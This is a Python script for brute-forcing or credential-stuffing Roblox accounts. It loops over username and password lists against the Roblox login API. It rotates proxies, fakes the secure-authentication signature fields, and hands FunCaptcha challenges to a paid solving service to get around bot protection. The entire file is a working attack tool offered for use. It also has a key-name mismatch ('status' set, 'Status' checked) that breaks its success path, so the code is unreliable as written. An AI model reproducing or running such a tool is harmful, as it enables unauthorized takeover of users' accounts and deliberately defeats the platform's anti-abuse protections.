import base64
import concurrent.futures
import json
import random
import ssl
import time

import capsolver
import requests
from colorama import Fore
from loguru import logger
from requests.adapters import HTTPAdapter

num_threads = 1
capsolver.api_key = ""

logger.enable("__main__")


# Had issues with openssl on my machine
class TLSAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
        kwargs["ssl_context"] = context
        return super(TLSAdapter, self).init_poolmanager(*args, **kwargs)


def create_session():
    session = requests.Session()
    session.mount("https://", TLSAdapter())
    session.headers = {
        "authority": "www.roblox.com",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "tr-TR,tr;q=0.7",
        "pragma": "no-cache",
        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Brave";v="120"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "sec-gpc": "1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/120.0.0.0 Safari/537.36",
    }
    return session


def get_csrf_token(session):
    response = session.get("https://www.roblox.com/home")
    token = response.text.split('"csrf-token" data-token="')[1].split('"')[0]
    session.headers["x-csrf-token"] = token


def get_server_nonce(session, proxy):
    response = session.get(
        "https://apis.roblox.com/hba-service/v1/getServerNonce",
        proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"},
    )
    logger.info("Got server nonce")
    return response.text.split('"')[1]


def get_epoch_timestamp():
    return str(time.time()).split(".")[0]


def start_login(session, username, password, proxy):
    response = session.post(
        "https://auth.roblox.com/v2/login",
        proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"},
        json={
            "ctype": "Username",
            "cvalue": username,
            "password": password,
            "secureAuthenticationIntent": {
                "clientPublicKey": "aaaaa",
                "clientEpochTimestamp": get_epoch_timestamp(),
                "serverNonce": get_server_nonce(session, proxy),
                "saiSignature": "aaa",
            },
        },
    )
    return response


def check_credentials(username, password):
    session = create_session()

    get_csrf_token(session)
    proxy = random.choice(open("proxies.txt", "r").readlines()).strip()

    logger.info("Attempting to get challenge metadata", level="INFO")
    session.headers["authority"] = "auth.roblox.com"
    login_request = start_login(session, username, password, proxy)

    if "Token Validation Failed" in login_request.text:
        session.headers["x-csrf-token"] = login_request.headers["x-csrf-token"]
        login_request = start_login(session, username, password, proxy)

    captcha_response = json.loads(
        base64.b64decode(
            login_request.headers["rblx-challenge-metadata"].encode()
        ).decode()
    )

    unified_captcha_id = captcha_response["unifiedCaptchaId"]
    data_exchange_blob = captcha_response["dataExchangeBlob"]
    generic_challenge_id = captcha_response["sharedParameters"]["genericChallengeId"]

    logger.info("Solving captcha", level="INFO")

    token = capsolver.solve(
        {
            "type": "FunCaptchaTask",
            "websiteURL": "https://www.roblox.com",
            "websitePublicKey": "476068BF-9607-4799-B53D-966BE98E2B81",
            "funcaptchaApiJSSubdomain": "https://roblox-api.arkoselabs.com",
            "data": '{"blob":"' + data_exchange_blob + '"}',
            "proxy": f"http://{proxy}",
        }
    )["token"]

    session.headers["authority"] = "apis.roblox.com"

    json_data = {
        "challengeId": generic_challenge_id,
        "challengeType": "captcha",
        "challengeMetadata": json.dumps(
            {
                "unifiedCaptchaId": generic_challenge_id,
                "captchaToken": token,
                "actionType": "Login",
            }
        ),
    }

    session.post(
        "https://apis.roblox.com/challenge/v1/continue",
        json=json_data,
        proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"},
    )

    logger.info("Continued captcha")

    session.headers["rblx-challenge-id"] = unified_captcha_id
    session.headers["rblx-challenge-type"] = "captcha"
    session.headers["rblx-challenge-metadata"] = base64.b64encode(
        json.dumps(
            {
                "unifiedCaptchaId": unified_captcha_id,
                "captchaToken": token,
                "actionType": "Login",
            }
        ).encode()
    ).decode()

    final_login = session.post(
        "https://auth.roblox.com/v2/login",
        proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"},
        json={
            "ctype": "Username",
            "cvalue": username,
            "password": password,
            "secureAuthenticationIntent": {
                "clientPublicKey": "roblox sucks",
                "clientEpochTimestamp": get_epoch_timestamp(),
                "serverNonce": get_server_nonce(session, proxy),
                "saiSignature": "lol",
            },
        },
    )

    login_response = final_login.json()
    if "user" in login_response:
        return {
            "status": True,
            "id": login_response["user"]["id"],
            "name": login_response["user"]["name"],
            "displayName": login_response["user"]["displayName"],
            "banned": login_response["isBanned"],
        }
    else:
        return {"Status": False}


def is_valid(input_str):
    return len(input_str) > 4


def process_line(username, line):
    line = line.strip()
    if is_valid(line):
        try:
            result = check_credentials(username, line)
            if result["Status"]:
                return Fore.GREEN + f"{username}:{line}"
            else:
                return Fore.RED + f"{username}:{line} {result}"

        except Exception as e:
            logger.error(f"Error processing line for {username}: {e}")
            return None
    return None


def main():
    with open("passwords.txt", "r") as file:
        lines = [line.strip() for line in file.readlines()]

    with open("usernames.txt", "r") as file:
        usernames = [line.strip() for line in file.readlines()]

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        for username in usernames:
            if is_valid(username):
                for line in lines:
                    future = executor.submit(process_line, username, line)
                    futures.append(future)

        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result()
                if result is not None:
                    print(result)
            except Exception as e:
                logger.error(f"Error in future result: {e}")


if __name__ == "__main__":
    main()
